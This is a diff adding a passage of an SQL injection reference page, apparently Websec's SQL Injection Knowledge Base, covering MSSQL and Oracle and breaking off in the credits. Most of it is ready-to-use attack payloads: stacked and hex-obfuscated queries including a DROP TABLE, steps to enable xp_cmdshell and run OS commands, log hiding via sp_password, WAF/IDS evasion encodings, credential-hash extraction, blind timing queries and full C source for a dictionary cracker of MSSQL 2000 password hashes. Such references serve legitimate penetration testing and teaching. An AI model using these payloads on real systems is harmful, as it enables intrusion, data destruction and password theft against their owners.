+						<li class="note">
+							You can encode your query in hex to "obfuscate" your attack.
+						</li>
+						<li class="code">
+							' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MSSQL_Avoiding_Quotations">Avoiding the use of quotations</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT * FROM Users WHERE username =  CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MSSQL_String_Concatenation">String Concatenation</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT CONCAT('a','a','a'); (SQL SERVER 2012)</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT 'a'+'d'+'mi'+'n';</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MSSQL_Conditional_Statements">Conditional Statements</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">IF</td>
+					</tr>
+					<tr>
+						<td class="code">CASE</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						<b class="injection">IF</b> 1=1 SELECT 'true' <b class="injection">ELSE</b> SELECT 'false';
+					</li>
+					<li class="code">
+						SELECT <b class="injection">CASE WHEN</b> 1=1 <b class="injection">THEN</b> true <b class="injection">ELSE</b> false <b class="injection">END</b>;
+					</li>
+				</ul>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							IF cannot be used inside a SELECT statement.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MSSQL_Timing">Timing</h2>
+				<ul class="data">
+					<li class="code">
+						WAITFOR DELAY 'time_to_pass';
+					</li>
+					<li class="code">
+						WAITFOR TIME 'time_to_execute';
+					</li>
+				</ul>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						IF 1=1 <b class="injection">WAITFOR DELAY '0:0:5'</b> ELSE <b class="injection">WAITFOR DELAY '0:0:0'</b>;
+					</li>
+				</ul>
+
+				<h2 id="MSSQL_OPENROWSET_Attacks">OPENROWSET Attacks</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MSSQL_System_Command_Execution">System Command Execution</h2>
+				<p>
+					Include an extended stored procedure named xp_cmdshell that can be used to execute operating system commands.
+				</p>
+				<ul class="data">
+					<li class="code">
+						EXEC master.dbo.xp_cmdshell 'cmd';
+					</li>
+				</ul>
+				<br>
+				<p>
+					Starting with version MSSQL 2005 and higher, xp_cmdshell is disabled by default, but can be activated with the following queries:
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">EXEC sp_configure 'show advanced options', 1</td>
+					</tr>
+					<tr>
+						<td class="code">EXEC sp_configure reconfigure</td>
+					</tr>
+					<tr>
+						<td class="code">EXEC sp_configure 'xp_cmdshell', 1</td>
+					</tr>
+					<tr>
+						<td class="code">EXEC sp_configure reconfigure</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<p>
+					Alternatively, you can create your own procedure to achieve the same results:
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">DECLARE @execmd INT</td>
+					</tr>
+					<tr>
+						<td class="code">EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT</td>
+					</tr>
+					<tr>
+						<td class="code">EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<p>
+					If the SQL version is higher than 2000, you will have to run additional queries in order the execute the previous command:
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">EXEC sp_configure 'show advanced options', 1</td>
+					</tr>
+					<tr>
+						<td class="code">EXEC sp_configure reconfigure</td>
+					</tr>
+					<tr>
+						<td class="code">EXEC sp_configure 'OLE Automation Procedures', 1</td>
+					</tr>
+					<tr>
+						<td class="code">EXEC sp_configure reconfigure</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li>
+						Checks to see if xp_cmdshell is loaded, if it is, it checks if it is active and then proceeds to run the 'dir' command and inserts the results into TMP_DB:
+					</li>
+					<li class="code">
+						' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'&lt;br&gt;&lt;/font&gt;&lt;font color="black"&gt;'%2Bdir,'&lt;dir&gt;','&lt;/font&gt;&lt;font color="orange"&gt;') FROM %23Data WHERE dir&gt;@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--
+					</li>
+				</ul>
+				<ul class="data example">
+					<li>
+						Dump Content:
+					</li>
+					<li class="code">
+						' UNION SELECT tbl FROM TMP_DB--
+					</li>
+				</ul>
+				<ul class="data example">
+					<li>
+						Delete Table:
+					</li>
+					<li class="code">
+						' DROP TABLE TMP_DB--
+					</li>
+				</ul>
+
+				<h2 id="MSSQL_SP_PASSWORD">SP_PASSWORD (Hiding Query)</h2>
+				<p>
+					Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure.
+				</p>
+				<ul class="data">
+					<li class="code">
+						SP_PASSWORD
+					</li>
+				</ul>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						' AND 1=1--<b class="injection">sp_password</b>
+					</li>
+				</ul>
+				<br>
+				<i>Output:</i>
+				<ul class="data">
+					<pre class="code">-- 'sp_password' was found in the text of this event.
+-- The text has been replaced with this comment for security reasons.
+					</pre>
+				</ul>
+
+				<h2 id="MSSQL_Stacked_Queries">Stacked Queries</h2>
+				<p>
+					MSSQL supports stacked queries.
+				</p>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');
+					</li>
+				</ul>
+
+				<h2 id="MSSQL_Fuzzing_Obfuscation">Fuzzing and Obfuscation</h2>
+				<h3 id="MSSQL_Allowed_Intermediary_Chars">Allowed Intermediary Characters</h3>
+				<p>
+					The following characters can be used as whitespaces.
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">01</td>
+						<td>Start of Heading</td>
+					</tr>
+					<tr>
+						<td class="code">02</td>
+						<td>Start of Text</td>
+					</tr>
+					<tr>
+						<td class="code">03</td>
+						<td>End of Text</td>
+					</tr>
+					<tr>
+						<td class="code">04</td>
+						<td>End of Transmission</td>
+					</tr>
+					<tr>
+						<td class="code">05</td>
+						<td>Enquiry</td>
+					</tr>
+					<tr>
+						<td class="code">06</td>
+						<td>Acknowledge</td>
+					</tr>
+					<tr>
+						<td class="code">07</td>
+						<td>Bell</td>
+					</tr>
+					<tr>
+						<td class="code">08</td>
+						<td>Backspace</td>
+					</tr>
+					<tr>
+						<td class="code">09</td>
+						<td>Horizontal Tab</td>
+					</tr>
+					<tr>
+						<td class="code">0A</td>
+						<td>New Line</td>
+					</tr>
+					<tr>
+						<td class="code">0B</td>
+						<td>Vertical Tab</td>
+					</tr>
+					<tr>
+						<td class="code">0C</td>
+						<td>New Page</td>
+					</tr>
+					<tr>
+						<td class="code">0D</td>
+						<td>Carriage Return</td>
+					</tr>
+					<tr>
+						<td class="code">0E</td>
+						<td>Shift Out</td>
+					</tr>
+					<tr>
+						<td class="code">0F</td>
+						<td>Shift In</td>
+					</tr>
+					<tr>
+						<td class="code">10</td>
+						<td>Data Link Escape</td>
+					</tr>
+					<tr>
+						<td class="code">11</td>
+						<td>Device Control 1</td>
+					</tr>
+					<tr>
+						<td class="code">12</td>
+						<td>Device Control 2</td>
+					</tr>
+					<tr>
+						<td class="code">13</td>
+						<td>Device Control 3</td>
+					</tr>
+					<tr>
+						<td class="code">14</td>
+						<td>Device Control 4</td>
+					</tr>
+					<tr>
+						<td class="code">15</td>
+						<td>Negative Acknowledge</td>
+					</tr>
+					<tr>
+						<td class="code">16</td>
+						<td>Synchronous Idle</td>
+					</tr>
+					<tr>
+						<td class="code">17</td>
+						<td>End of Transmission Block</td>
+					</tr>
+					<tr>
+						<td class="code">18</td>
+						<td>Cancel</td>
+					</tr>
+					<tr>
+						<td class="code">19</td>
+						<td>End of Medium</td>
+					</tr>
+					<tr>
+						<td class="code">1A</td>
+						<td>Substitute</td>
+					</tr>
+					<tr>
+						<td class="code">1B</td>
+						<td>Escape</td>
+					</tr>
+					<tr>
+						<td class="code">1C</td>
+						<td>File Separator</td>
+					</tr>
+					<tr>
+						<td class="code">1D</td>
+						<td>Group Separator</td>
+					</tr>
+					<tr>
+						<td class="code">1E</td>
+						<td>Record Separator</td>
+					</tr>
+					<tr>
+						<td class="code">1F</td>
+						<td>Unit Separator</td>
+					</tr>
+					<tr>
+						<td class="code">20</td>
+						<td>Space</td>
+					</tr>
+					<tr>
+						<td class="code">25</td>
+						<td>%</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						S<b class="injection">%</b>E<b class="injection">%</b>L<b class="injection">%</b>E<b class="injection">%</b>C<b class="injection">%</b>T<b class="injection">%01</b>column<b class="injection">%02</b>FROM<b class="injection">%03</b>table;
+					</li>
+					<li class="code">
+						A<b class="injection">%%</b>ND 1=<b class="injection">%%%%%%%%</b>1;
+					</li>
+				</ul>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							The percentage signs in between keywords is only possible on ASP(x) web applications.
+						</li>
+					</i></ul>
+				<p></p>
+				<br>
+				<p>
+					The following characters can be also used to avoid the use of spaces.
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">22</td>
+						<td>"</td>
+					</tr>
+					<tr>
+						<td class="code">28</td>
+						<td>(</td>
+					</tr>
+					<tr>
+						<td class="code">29</td>
+						<td>)</td>
+					</tr>
+					<tr>
+						<td class="code">5B</td>
+						<td>[</td>
+					</tr>
+					<tr>
+						<td class="code">5D</td>
+						<td>]</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						UNION<b class="injection">(</b>SELECT<b class="injection">(</b>column<b class="injection">)</b>FROM<b class="injection">(</b>table<b class="injection">))</b>;
+					</li>
+					<li class="code">
+						SELECT<b class="injection">"</b>table_name<b class="injection">"</b>FROM<b class="injection">[</b>information_schema<b class="injection">]</b>.<b class="injection">[</b>tables<b class="injection">]</b>;
+					</li>
+				</ul>
+
+				<h3 id="MSSQL_Allowed_Intermediary_Chars_AND-OR">Allowed Intermediary Characters after AND/OR</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">01 - 20</td>
+						<td>Range</td>
+					</tr>
+					<tr>
+						<td class="code">21</td>
+						<td>!</td>
+					</tr>
+					<tr>
+						<td class="code">2B</td>
+						<td>+</td>
+					</tr>
+					<tr>
+						<td class="code">2D</td>
+						<td>-</td>
+					</tr>
+					<tr>
+						<td class="code">2E</td>
+						<td>.</td>
+					</tr>
+					<tr>
+						<td class="code">5C</td>
+						<td>\</td>
+					</tr>
+					<tr>
+						<td class="code">7E</td>
+						<td>~</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT <b class="injection">1F</b>ROM[table]WHERE<b class="injection">\</b>1=<b class="injection">\1A</b>ND<b class="injection">\</b>1=<b class="injection">\</b>1;
+					</li>
+				</ul>
+				<p>
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							The backslash does not seem to work with MSSQL 2000.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h3 id="MSSQL_Encodings">Encodings</h3>
+				<p>
+					Encoding your injection can sometimes be useful for WAF/IDS evasion.
+				</p>
+				<table>
+					<tbody><tr>
+						<td>URL Encoding</td>
+						<td class="code">SELECT %74able_%6eame FROM information_schema.tables;</td>
+					</tr>
+					<tr>
+						<td>Double URL Encoding</td>
+						<td class="code">SELECT %2574able_%256eame FROM information_schema.tables;</td>
+					</tr>
+					<tr>
+						<td>Unicode Encoding</td>
+						<td class="code">SELECT %u0074able_%u6eame FROM information_schema.tables;</td>
+					</tr>
+					<tr>
+						<td>Invalid Hex Encoding (ASP)</td>
+						<td class="code">SELECT %tab%le_%na%me FROM information_schema.tables;</td>
+					</tr>
+					<tr>
+						<td>Hex Encoding</td>
+						<td class="code">' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--</td>
+					</tr>
+					<tr>
+						<td>HTML Entities (Needs to be verified)</td>
+						<td class="code">%26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MSSQL_Password_Hashing">Password Hashing</h2>
+				<p>
+					Passwords begin with 0x0100, the first for bytes following the 0x are a constant; the next eight bytes are the hash salt and the remaining 80 bytes are two hashes, the first 40 bytes are a case-sensitive hash of the password, while the second 40 bytes are the uppercase version.
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MSSQL_Password_Cracking">Password Cracking</h2>
+				<p>
+					A Metasploit module for JTR can be found <a href="http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast" target="_blank" rel="noopener">here</a>.
+				</p>
+				<h3>MSSQL 2000 Password Cracker</h3>
+				<p>
+					This tool is designed to crack Microsoft SQL Server 2000 passwords.
+				</p>
+				<ul class="data">
+					<small> 						<pre>/////////////////////////////////////////////////////////////////////////////////
+//
+//           SQLCrackCl
+//
+//           This will perform a dictionary attack against the
+//           upper-cased hash for a password. Once this
+//           has been discovered try all case variant to work
+//           out the case sensitive password.
+//
+//           This code was written by David Litchfield to
+//           demonstrate how Microsoft SQL Server 2000
+//           passwords can be attacked. This can be
+//           optimized considerably by not using the CryptoAPI.
+//
+//           (Compile with VC++ and link with advapi32.lib
+//           Ensure the Platform SDK has been installed, too!)
+//
+//////////////////////////////////////////////////////////////////////////////////
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+FILE *fd=NULL;
+char *lerr = "\nLength Error!\n";
+int wd=0;
+int OpenPasswordFile(char *pwdfile);
+int CrackPassword(char *hash);
+int main(int argc, char *argv[])
+{
+	         int err = 0;
+	    if(argc !=3)
+	              {
+	                        printf("\n\n*** SQLCrack *** \n\n");
+	                        printf("C:\\&gt;%s hash passwd-file\n\n",argv[0]);
+	                        printf("David Litchfield (david@ngssoftware.com)\n");
+	                        printf("24th June 2002\n");
+	                        return 0;
+	              }
+	    err = OpenPasswordFile(argv[2]);
+	    if(err !=0)
+	     {
+	       return printf("\nThere was an error opening the password file %s\n",argv[2]);
+	     }
+	    err = CrackPassword(argv[1]);
+	    fclose(fd);
+	    printf("\n\n%d",wd);
+	    return 0;
+}
+int OpenPasswordFile(char *pwdfile)
+{
+	    fd = fopen(pwdfile,"r");
+	    if(fd)
+	              return 0;
+	    else
+	              return 1;
+}
+int CrackPassword(char *hash)
+{
+	    char phash[100]="";
+	    char pheader[8]="";
+	    char pkey[12]="";
+	    char pnorm[44]="";
+	    char pucase[44]="";
+	    char pucfirst[8]="";
+	    char wttf[44]="";
+	    char uwttf[100]="";
+	    char *wp=NULL;
+	    char *ptr=NULL;
+	    int cnt = 0;
+	    int count = 0;
+	    unsigned int key=0;
+	    unsigned int t=0;
+	    unsigned int address = 0;
+	    unsigned char cmp=0;
+	    unsigned char x=0;
+	    HCRYPTPROV hProv=0;
+	    HCRYPTHASH hHash;
+DWORD hl=100;
+unsigned char szhash[100]="";
+int len=0;
+if(strlen(hash) !=94)
+	      {
+	              return printf("\nThe password hash is too short!\n");
+	      }
+if(hash[0]==0x30 &amp;&amp; (hash[1]== 'x' || hash[1] == 'X'))
+	      {
+	              hash = hash + 2;
+	              strncpy(pheader,hash,4);
+	              printf("\nHeader\t\t: %s",pheader);
+	              if(strlen(pheader)!=4)
+	                        return printf("%s",lerr);
+	              hash = hash + 4;
+	              strncpy(pkey,hash,8);
+	              printf("\nRand key\t: %s",pkey);
+	              if(strlen(pkey)!=8)
+	                        return printf("%s",lerr);
+	              hash = hash + 8;
+	              strncpy(pnorm,hash,40);
+	              printf("\nNormal\t\t: %s",pnorm);
+	              if(strlen(pnorm)!=40)
+	                        return printf("%s",lerr);
+	              hash = hash + 40;
+	              strncpy(pucase,hash,40);
+	              printf("\nUpper Case\t: %s",pucase);
+	              if(strlen(pucase)!=40)
+	                        return printf("%s",lerr);
+	              strncpy(pucfirst,pucase,2);
+	              sscanf(pucfirst,"%x",&amp;cmp);
+	      }
+else
+	      {
+	              return printf("The password hash has an invalid format!\n");
+	      }
+printf("\n\n       Trying...\n");
+if(!CryptAcquireContextW(&amp;hProv, NULL , NULL , PROV_RSA_FULL                 ,0))
+  {
+	      if(GetLastError()==NTE_BAD_KEYSET)
+	              {
+	                        // KeySet does not exist. So create a new keyset
+	                        if(!CryptAcquireContext(&amp;hProv,
+	                                             NULL,
+	                                             NULL,
+	                                             PROV_RSA_FULL,
+	                                             CRYPT_NEWKEYSET ))
+	                           {
+	                                    printf("FAILLLLLLL!!!");
+	                                    return FALSE;
+	                           }
+	       }
+}
+while(1)
+	     {
+	       // get a word to try from the file
+	       ZeroMemory(wttf,44);
+	       if(!fgets(wttf,40,fd))
+	          return printf("\nEnd of password file. Didn't find the password.\n");
+	       wd++;
+	       len = strlen(wttf);
+	       wttf[len-1]=0x00;
+	       ZeroMemory(uwttf,84);
+	       // Convert the word to UNICODE
+	       while(count &lt; len)
+	                 {
+	                           uwttf[cnt]=wttf[count];
+	                           cnt++;
+	                           uwttf[cnt]=0x00;
+	                           count++;
+	                           cnt++;
+	                 }
+	       len --;
+	       wp = &amp;uwttf;
+	       sscanf(pkey,"%x",&amp;key);
+	       cnt = cnt - 2;
+	       // Append the random stuff to the end of
+	       // the uppercase unicode password
+	       t = key &gt;&gt; 24;
+	       x = (unsigned char) t;
+	       uwttf[cnt]=x;
+	       cnt++;
+	       t = key &lt;&lt; 8;
+	       t = t &gt;&gt; 24;
+	     x = (unsigned char) t;
+	     uwttf[cnt]=x;
+	     cnt++;
+	     t = key &lt;&lt; 16;
+	     t = t &gt;&gt; 24;
+	     x = (unsigned char) t;
+	     uwttf[cnt]=x;
+	     cnt++;
+	     t = key &lt;&lt; 24;
+	     t = t &gt;&gt; 24;
+	     x = (unsigned char) t;
+	     uwttf[cnt]=x;
+	     cnt++;
+// Create the hash
+if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &amp;hHash))
+	     {
+	               printf("Error %x during CryptCreatHash!\n", GetLastError());
+	               return 0;
+	     }
+if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))
+	     {
+	               printf("Error %x during CryptHashData!\n", GetLastError());
+	               return FALSE;
+	     }
+CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&amp;hl,0);
+// Test the first byte only. Much quicker.
+if(szhash[0] == cmp)
+	     {
+	               // If first byte matches try the rest
+	               ptr = pucase;
+	               cnt = 1;
+	               while(cnt &lt; 20)
+	               {
+	                           ptr = ptr + 2;
+	                           strncpy(pucfirst,ptr,2);
+	                           sscanf(pucfirst,"%x",&amp;cmp);
+	                           if(szhash[cnt]==cmp)
+	                                    cnt ++;
+	                           else
+	                           {
+	                                    break;
+	                           }
+	               }
+	               if(cnt == 20)
+	               {
+	                    // We've found the password
+	                    printf("\nA MATCH!!! Password is %s\n",wttf);
+	                    return 0;
+	                 }
+	         }
+	         count = 0;
+	         cnt=0;
+	       }
+  return 0;
+}
+					</pre> </small>
+				</ul>
+			</ul>
+
+			<ul id="Oracle_Content">
+				<h1>Oracle</h1>
+				<h2 id="Oracle_Default_Databases">Default Databases</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SYSTEM</td>
+						<td>Available in all versions</td>
+					</tr>
+					<tr>
+						<td class="code">SYSAUX</td>
+						<td>Available in all versions</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Comment_Out_Query">Comment Out Query</h2>
+				<p>
+					The following can be used to comment out the rest of the query after your injection:
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">--</td>
+						<td>SQL comment</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT * FROM Users WHERE username = '' OR 1=1 <b class="injection">--</b>' AND password = '';
+					</li>
+				</ul>
+
+				<h2 id="Oracle_Testing_Version">Testing Version</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT banner FROM v$version WHERE banner LIKE 'TNS%';</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT version FROM v$instance;</td>
+					</tr>
+				</tbody></table>
+				<p>
+					<i> Notes:
+					</i></p><ul class="note"><i>
+						<li class="note">
+							All SELECT statements in Oracle must contain a table.
+						</li>
+						<li class="note">
+							<code>
+								dual
+							</code>
+							is a dummy table which can be used for testing.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="Oracle_Database_Credentials">Database Credentials</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT username FROM all_users;</td>
+						<td class="code">Available on all versions</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT name, password from sys.user$;</td>
+						<td class="code">Privileged, &lt;= 10g</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT name, spare4 from sys.user$;</td>
+						<td class="code">Privileged, &lt;= 11g</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Database_Names">Database Names</h2>
+				<h3 id="Oracle_Current_Database">Current Database</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT name FROM v$database;</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT instance_name FROM v$instance</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT global_name FROM global_name</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT SYS.DATABASE_NAME FROM DUAL</td>
+					</tr>
+				</tbody></table>
+				<h3 id="Oracle_User_Databases">User Databases</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT DISTINCT owner FROM all_tables;</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Server_Hostname">Server Hostname</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT host_name FROM v$instance; (Privileged)</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT UTL_INADDR.get_host_name FROM dual;</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT UTL_INADDR.get_host_address FROM dual;</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Tables_And_Columns">Tables and Columns</h2>
+				<h3 id="Oracle_Retrieving_Tables">Retrieving Tables</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT table_name FROM all_tables;</td>
+					</tr>
+				</tbody></table>
+				<h3 id="Oracle_Retrieving_Columns">Retrieving Columns</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT column_name FROM all_tab_columns;</td>
+					</tr>
+				</tbody></table>
+				<h3 id="Oracle_Find_Tables_From_Columns">Find Tables from Column Name</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT column_name FROM all_tab_columns WHERE table_name = 'Users';</td>
+					</tr>
+				</tbody></table>
+				<h3 id="Oracle_Find_Columns_From_Tables">Find Columns From Table Name</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT table_name FROM all_tab_tables WHERE column_name = 'password';</td>
+					</tr>
+				</tbody></table>
+				<h3 id="Oracle_Retrieving_Multiple_Tables">Retrieving Multiple Tables at once</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || ',')).EXTRACT('//text()').EXTRACT('//text()') ,',') FROM all_tables;</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Avoiding_Quotations">Avoiding the use of quotations</h2>
+				<p>
+					Unlike other RDBMS, Oracle allows table/column names to be encoded.
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT 0x09120911091 FROM dual;</td>
+						<td>Hex Encoding.</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT CHR(32)||CHR(92)||CHR(93) FROM dual;</td>
+						<td>CHR() Function.</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_String_Concatenation">String Concatenation</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT 'a'||'d'||'mi'||'n' FROM dual;</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Conditional_Statements">Conditional Statements</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM dual</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Timing">Timing</h2>
+				<h3 id="Oracle_Time_Delay">Time Delay</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT UTL_INADDR.get_host_address('non-existant-domain.com') FROM dual;</td>
+					</tr>
+				</tbody></table>
+
+				<h3 id="Oracle_Heavy_Time_Delays">Heavy Time Delays</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) &gt; 0 AND 300 &gt; ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1),1,1));</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Privileges">Privileges</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT privilege FROM session_privs;</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT grantee, granted_role FROM dba_role_privs; (Privileged)</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_OOB_Channeling">Out Of Band Channeling</h2>
+				<h3 id="Oracle_DNS_Requests">DNS Requests</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Oracle_Password_Cracking">Password Cracking</h2>
+				<p>
+					A Metasploit module for JTR can be found <a href="http://www.metasploit.com/modules/auxiliary/analyze/jtr_oracle_fast" target="_blank" rel="noopener">here</a>.
+				</p>
+
+			</ul>
+
+			<ul id="Extra_Content">
+				<h1>Extras</h1>
+				<h2 id="Extra_About">About</h2>
+				<p>
+					This Knowledge Base was put together and is maintained by Roberto Salgado, Co-Founder of Websec. It is a compilation of books, papers, cheatsheets and testing done by Roberto over the years.
+				</p>
+
+				<h2 id="Extra_Contact">Contact</h2>
+				<p>
+					Please feel free to send any suggestions you may have to <a href="https://twitter.com/LightOS" target="_blank">@LightOS</a> or <a href="mailto:rsalgado@websec.ca?Subject=SQL%20Injection%20KB" target="_blank" rel="noopener">e-mail</a>.
+				</p>
+
+				<h2 id="Extra_Special_Thanks">Special Thanks</h2>
+				<table class="noborder">
+					<tbody><tr>
+						<td><a href="https://twitter.com/garretthyder" target="_blank">Garrett Hyder</a></td>
+						<td>Helped me tremendously with the CSS and some JQuery bugs.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/fluxreiners" target="_blank">Johannes Dahse</a></td>
+						<td>Helped me create the original version.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/sunnyfunnyface" target="_blank">Lisa Richards</a></td>
+						<td>Made the tough decisions for me.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/0x6D6172696F" target="_blank">Mario Heiderich</a></td>
+						<td>Helped me create the original version.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/_hkm" target="_blank">Pedro Joaqu�n</a></td>
+						<td>Motivated me to finish this.</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="Extra_Contributions">Contributions</h2>
+				<table class="noborder">
+					<tbody><tr>
+						<td><a href="https://twitter.com/calderpwn" target="_blank">Paulino Calder�n</a></td>
+						<td>Gave me the idea of adding a changelog.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/nitr0usmx" target="_blank">Alejandro Hern�ndez</a></td>
+						<td>Pointed out some missing code for the password crackers.</td>
+					</tr>
+					<tr>
+						<td><a href="https://twitter.com/LightOS/status/222476073449955330" target="_blank">Denis Baranov</a></td>
+						<td>Contributed with links for Error based methods and Acknowledgements.</td>
+					</tr>
+					<tr>
